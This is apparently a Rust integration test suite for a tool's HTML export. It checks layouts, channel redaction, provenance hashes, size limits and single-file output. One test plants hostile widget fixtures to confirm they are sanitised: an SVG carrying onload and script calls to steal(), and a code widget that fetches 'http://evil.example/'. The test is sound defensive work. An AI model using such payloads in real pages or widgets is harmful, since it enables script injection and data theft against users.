//! `tlmbench export html` end to end: the data files, the layout's channels, redaction, budgets, the checks summary,
//! and that nothing is written beside the input.

use std::path::{Path, PathBuf};
use std::process::{Command, Output};

fn fixtures() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../prototype/tests")
}

fn run(cache: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_tlmbench"))
        .args(["export", "html", "--cache"])
        .arg(cache)
        .args(args)
        .output()
        .unwrap()
}

fn manifest(out: &Path) -> serde_json::Value {
    serde_json::from_slice(&std::fs::read(out.join("export.json")).unwrap()).unwrap()
}

#[test]
fn writes_the_layout_channels_and_nothing_beside_the_input() {
    let tmp = tempfile::tempdir().unwrap();
    let cache = tmp.path().join("cache");
    let src = fixtures().join("fold/stocks/AAPL.csv");
    let src = src.to_str().unwrap();
    let out = tmp.path().join("site");
    let o = out.to_str().unwrap();
    let view = tmp.path().join("v.json");
    std::fs::write(&view, r#"{"schema":1,"name":"Two","panes":[{"channels":["Close"],"view":"chart"},{"channels":["Open"],"view":"table"}]}"#).unwrap();
    let r = run(&cache, &["--no-viewer", "--layout", view.to_str().unwrap(), "--out", o, "--json", src]);
    assert!(r.status.success(), "{}", String::from_utf8_lossy(&r.stderr));
    let m = manifest(&out);
    let names: Vec<&str> =
        m["files"][0]["channels"].as_array().unwrap().iter().map(|c| c["name"].as_str().unwrap()).collect();
    assert_eq!(names, ["Open", "Close"]);
    assert_eq!(m["layout"]["name"], "Two");
    assert_eq!(m["files"][0]["samples"], 521);
    // how it was made: the command line, a hash of the configuration, the core's version and the input's hash
    let pv = &m["provenance"];
    assert!(pv["command"].as_array().unwrap().iter().any(|a| a == "--layout"));
    assert_eq!(pv["core_version"], env!("CARGO_PKG_VERSION"));
    assert!(pv["created"].as_u64().is_some_and(|t| t > 1_700_000_000_000), "made at a real time: {}", pv["created"]);
    let hex =
        |v: &serde_json::Value| v.as_str().is_some_and(|h| h.len() == 64 && h.bytes().all(|b| b.is_ascii_hexdigit()));
    assert!(hex(&pv["config_hash"]));
    let input = &pv["inputs"][0];
    assert_eq!(input["bytes"], std::fs::metadata(src).unwrap().len());
    assert_eq!(input["blake3"], blake3::hash(&std::fs::read(src).unwrap()).to_hex().to_string());
    // all channels, minus a redacted one
    let all = tmp.path().join("all");
    let r = run(&cache, &["--no-viewer", "--all-channels", "--redact", "Volume", "--out", all.to_str().unwrap(), src]);
    assert!(r.status.success(), "{}", String::from_utf8_lossy(&r.stderr));
    let m = manifest(&all);
    // another configuration is another hash; the same one, written elsewhere, is the same hash
    assert_ne!(m["provenance"]["config_hash"], pv["config_hash"]);
    let again = tmp.path().join("again");
    let r = run(&cache, &["--no-viewer", "--layout", view.to_str().unwrap(), "--out", again.to_str().unwrap(), src]);
    assert!(r.status.success(), "{}", String::from_utf8_lossy(&r.stderr));
    assert_eq!(manifest(&again)["provenance"]["config_hash"], pv["config_hash"]);
    assert!(m["files"][0]["channels"].as_array().unwrap().iter().all(|c| c["name"] != "Volume"));
    assert!(m["files"][0]["channels"].as_array().unwrap().len() >= 3);
    // a tiny budget trims, light keeps raw only for the table channel
    let tiny = tmp.path().join("tiny");
    let r = run(
        &cache,
        &["--no-viewer", "--mode", "light", "--layout", view.to_str().unwrap(), "--out", tiny.to_str().unwrap(), src],
    );
    assert!(r.status.success(), "{}", String::from_utf8_lossy(&r.stderr));
    let m = manifest(&tiny);
    let raw: Vec<(&str, bool)> = m["files"][0]["channels"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| (c["name"].as_str().unwrap(), c["raw"].as_bool().unwrap()))
        .collect();
    assert_eq!(raw, [("Open", true), ("Close", false)]);
    // bad input: exit 3 for a view that isn't there, a size that isn't one
    assert_eq!(run(&cache, &["--no-viewer", "--layout", "Nope", "--out", o, src]).status.code(), Some(3));
    assert_eq!(run(&cache, &["--no-viewer", "--budget", "lots", "--out", o, src]).status.code(), Some(3));
    // nothing was written beside the input
    assert!(
        std::fs::read_dir(fixtures().join("fold/stocks")).unwrap().all(|e| !e
            .unwrap()
            .file_name()
            .to_string_lossy()
            .contains("export"))
    );
}

#[test]
fn a_redacted_channel_leaves_the_checks_and_the_event_lists() {
    let tmp = tempfile::tempdir().unwrap();
    let cache = tmp.path().join("cache");
    let src = fixtures().join("fold/stocks/AAPL.csv");
    let src = src.to_str().unwrap();
    let cfg = tmp.path().join("cfg");
    std::fs::create_dir_all(cfg.join("checks")).unwrap();
    std::fs::create_dir_all(cfg.join("events")).unwrap();
    let check = |name: &str, expect: &str| {
        format!(
            "[[check]]\nname = \"{name}\"\nkind = \"check\"\ngroup = \"G\"\nexpect = \"{expect}\"\nseverity = \"fail\"\nenabled = true\n\n"
        )
    };
    std::fs::write(
        cfg.join("checks/s.toml"),
        format!(
            "schema = 1\nname = \"Limits\"\nruns_on_any_file = true\n\n{}{}",
            check("close below 1", "Close < 1"),
            check("open below 1", "Open < 1")
        ),
    )
    .unwrap();
    std::fs::write(
        cfg.join("events/e.toml"),
        "schema = 1\nrecording = \"AAPL.csv\"\nidentity = \"x\"\n\n[[event]]\nid = \"e1\"\nname = \"look\"\nstart = 0\nduration = 0\nchannels = [\"Close\", \"Volume\"]\n",
    )
    .unwrap();
    let out = tmp.path().join("site");
    let r = run(
        &cache,
        &[
            "--no-viewer",
            "--all-channels",
            "--config",
            cfg.to_str().unwrap(),
            "--checks",
            "Limits",
            "--redact",
            "Volume,Close",
            "--out",
            out.to_str().unwrap(),
            src,
        ],
    );
    assert!(r.status.success(), "{}", String::from_utf8_lossy(&r.stderr));
    let m = manifest(&out);
    let names: Vec<&str> = m["checks"][0]["set"]["check"]
        .as_array()
        .or_else(|| m["checks"][0]["set"]["checks"].as_array())
        .unwrap()
        .iter()
        .map(|c| c["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, ["open below 1"], "the check that reads Close left with the channel");
    assert_eq!(m["checks"][0]["result"]["outcomes"].as_array().unwrap().len(), 1);
    assert!(m["checks"][0]["events"].as_array().unwrap().iter().all(|e| e["name"] == "open below 1"));
    // the event stays, without the redacted names in its channel list
    let ev = &m["events"][0]["events"];
    assert_eq!(ev[0]["name"], "look");
    assert_eq!(ev[0]["channels"].as_array().unwrap().len(), 0);
}

#[test]
fn shared_widgets_travel_safe_svg_sanitised_and_code_as_a_value_card() {
    let tmp = tempfile::tempdir().unwrap();
    let cache = tmp.path().join("cache");
    let src = fixtures().join("fold/stocks/AAPL.csv");
    let src = src.to_str().unwrap();
    let cfg = tmp.path().join("cfg");
    let w = |dir: &str, toml: &str, file: &str, body: &str| {
        std::fs::create_dir_all(cfg.join("widgets").join(dir)).unwrap();
        std::fs::write(cfg.join("widgets").join(dir).join("widget.toml"), toml).unwrap();
        std::fs::write(cfg.join("widgets").join(dir).join(file), body).unwrap();
    };
    w(
        "dial",
        "schema = 1\nname = \"Dial\"\nkind = \"svg\"\nentry = \"widget.svg\"\n",
        "widget.svg",
        "<svg viewBox=\"0 0 10 10\" onload=\"steal()\"><script>steal()</script><text>{{value}}</text></svg>",
    );
    w(
        "bar",
        "schema = 1\nname = \"Bar (code)\"\nkind = \"code\"\nentry = \"widget.js\"\n",
        "widget.js",
        "export default { build(el) { fetch('http://evil.example/') } }",
    );
    let out = tmp.path().join("site");
    let r = run(&cache, &["--no-viewer", "--config", cfg.to_str().unwrap(), "--out", out.to_str().unwrap(), src]);
    assert!(r.status.success(), "{}", String::from_utf8_lossy(&r.stderr));
    let m = manifest(&out);
    let ws = m["widgets"].as_array().unwrap();
    let by = |id: &str| ws.iter().find(|w| w["id"] == id).unwrap_or_else(|| panic!("{id} missing from {ws:?}"));
    let dial = by("sw_dial");
    assert!(dial["svg"].as_str().unwrap().contains("{{value}}"));
    assert!(!dial["svg"].as_str().unwrap().contains("steal") && dial["card"] == false);
    let bar = by("sw_bar");
    assert!(bar["code"].is_null() && bar["card"] == true);
    assert!(!std::fs::read_to_string(out.join("export.json")).unwrap().contains("evil.example"));
}

#[test]
fn one_file_carries_every_raw_sample_when_they_fit_and_the_limit_is_a_flag() {
    let tmp = tempfile::tempdir().unwrap();
    let cache = tmp.path().join("cache");
    let src = fixtures().join("fold/stocks/AAPL.csv");
    let src = src.to_str().unwrap();
    let page = tmp.path().join("mail/aapl.html");
    let r = run(&cache, &["--single-file", "--out", page.to_str().unwrap(), "--json", src]);
    let err = String::from_utf8_lossy(&r.stderr);
    if err.contains("no one-file viewer") {
        eprintln!("skipped: this build has no one-file viewer (run `just viewer`)");
        return;
    }
    assert!(r.status.success(), "{err}");
    let json: serde_json::Value = serde_json::from_slice(&r.stdout).unwrap();
    // it fits the 25 MB default, so every raw sample is in it (Full), not Light
    assert_eq!(json["report"]["mode"], "full", "{json}");
    assert_eq!(json["report"]["trimmed"], false);
    let size = std::fs::metadata(&page).unwrap().len();
    assert!(size > 0 && size <= 25 << 20, "{size}");
    assert_eq!(std::fs::read_dir(page.parent().unwrap()).unwrap().count(), 1, "nothing else is written");
    // --single-limit is the cap: too small for the page and the core, it says so and writes nothing
    let small = tmp.path().join("small.html");
    let r = run(&cache, &["--single-file", "--single-limit", "100KB", "--out", small.to_str().unwrap(), src]);
    assert!(!r.status.success());
    assert!(String::from_utf8_lossy(&r.stderr).contains("limit"), "{}", String::from_utf8_lossy(&r.stderr));
    assert!(!small.exists());
    // a size that isn't one is refused
    let r = run(&cache, &["--single-file", "--single-limit", "lots", "--out", small.to_str().unwrap(), src]);
    assert_eq!(r.status.code(), Some(3));
}
